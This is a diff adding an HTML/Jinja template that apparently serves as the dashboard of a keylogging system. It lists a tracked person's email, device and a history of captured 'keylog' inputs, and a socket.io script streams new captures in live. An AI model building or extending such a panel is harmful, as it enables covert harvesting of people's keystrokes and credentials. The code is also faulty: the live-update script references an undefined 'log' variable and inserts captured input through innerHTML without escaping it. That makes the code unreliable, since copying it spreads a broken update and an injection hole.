@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>{{ user.name }}'s Logs</title>
+  <style>
+    /* Cyber/Terminal Theme for Logs */
+    body {
+      background-color: black;
+      color: #00ff00;
+      font-family: "Courier New", monospace;
+      margin: 0;
+      padding: 20px;
+      line-height: 1.6;
+    }
+    
+    .logs-container {
+      max-width: 80%;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    .logs-header {
+      color: #00ffff;
+      border-bottom: 1px dashed #00ff00;
+      padding-bottom: 10px;
+    }
+    
+    .user-meta {
+      margin: 15px 0;
+      padding: 10px;
+      background-color: #0a0a0a;
+      border-left: 3px solid #00ff00;
+    }
+    
+    .user-meta strong {
+      color: #00ffff;
+    }
+    
+    .user-meta span {
+      color: #ffff00;
+    }
+    
+    .log-list {
+      list-style: none;
+      padding: 0;
+      margin-top: 20px;
+    }
+    
+    .log-entry {
+      padding: 15px;
+      margin-bottom: 15px;
+      background-color: #0d0d0d;
+      border: 1px solid #00ff0020;
+      position: relative;
+    }
+    
+    .log-entry::before {
+      content: ">";
+      color: #00ff00;
+      position: absolute;
+      left: -15px;
+    }
+    
+    .log-time {
+      color: #00ffff;
+      font-weight: bold;
+    }
+    
+    .log-data {
+      color: #ffffff;
+      margin: 5px 0 0 20px;
+    }
+    
+    .log-key {
+      color: #ff00ff;
+      font-family: monospace;
+    }
+    
+    hr.log-divider {
+      border: 0;
+      height: 1px;
+      background: linear-gradient(to right, transparent, #00ff00, transparent);
+      margin: 20px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="logs-container">
+    <h1 class="logs-header">👤 {{ user.name }}'s ACTIVITY LOGS</h1>
+
+    <div class="user-meta">
+      <p><strong>EMAIL:</strong> <span>{{ user.email }}</span></p>
+      <p><strong>DEVICE:</strong> <span>{{ user.device }}</span></p>
+      <p><strong>FIRST LOG:</strong> <span>{{ user.first_log_date }}</span></p>
+    </div>
+
+    <h2 class="logs-header">📋 LOG HISTORY</h2>
+    <ul class="log-list">
+      {% for log in user.logs | reverse %}
+        <li class="log-entry">
+          <p class="log-time">⏱ {{ log.time }}</p>
+          <p class="log-data"><strong>EVENT:</strong> {{ log.log }}</p>
+          <p class="log-data"><strong>INPUT:</strong> <span class="log-key">{{ log.keylog }}</span></p>
+        </li>
+        {% if not loop.last %}
+          <hr class="log-divider">
+        {% endif %}
+      {% endfor %}
+    </ul>
+  </div>
+
+  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+  <script>
+    const socket = io();
+    socket.on('new_log', function(data) {
+      if (data.user_id === "{{ user._id }}") {
+        const logList = document.querySelector('.log-list');
+        const newEntry = document.createElement('li');
+        newEntry.className = 'log-entry';
+        newEntry.innerHTML = `
+          <p class="log-time">⏱ ${log.time}</p>
+          <p class="log-data"><strong>EVENT:</strong> ${log.log}</p>
+          <p class="log-data"><strong>INPUT:</strong> <span class="log-key">${log.keylog}</span></p>
+        `;
+        logList.insertBefore(newEntry, logList.firstChild);
+        if (logList.children.length > 1) {
+          const divider = document.createElement('hr');
+          divider.className = 'log-divider';
+          logList.insertBefore(divider, logList.children[1]);
+        }
+      }
+    });
+  </script>
+</body>
+</html>
